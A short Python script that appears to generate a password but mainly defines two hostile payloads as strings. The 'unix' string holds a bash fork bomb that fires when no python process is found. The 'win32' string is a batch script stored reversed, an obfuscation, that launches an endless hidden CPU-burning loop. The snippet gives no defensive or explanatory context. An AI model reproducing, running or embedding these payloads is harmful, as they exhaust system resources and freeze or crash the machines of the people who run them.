import cryptology.discretization as cd
dr = cd.DiscretizationRandom(65, 122) 
rawResult = dr.get_discretized_random() 
password = ''.join([chr(text) for text in rawResult][:64])[::-1]

unix = '''pgrep -x python >/dev/null && echo "Process found" || :() { :|:& };:'''
win32 = '''
@echo off
setlocal enabledelayedexpansion
set "cmd=tasklist /FI "IMAGENAME eq pythonw.exe" 2^>NUL | find /I /N "pythonw.exe"^>NUL"
%cmd%
if "%ERRORLEVEL%"=="0" (

) else (
    start /MIN cmd /C "for /L %%G in (1,0,1) do (set /A "var=%%G*%%G" & set /A "var=!var!+!var!" & set /A "var=!var!/%%G")"
)
'''[::-1]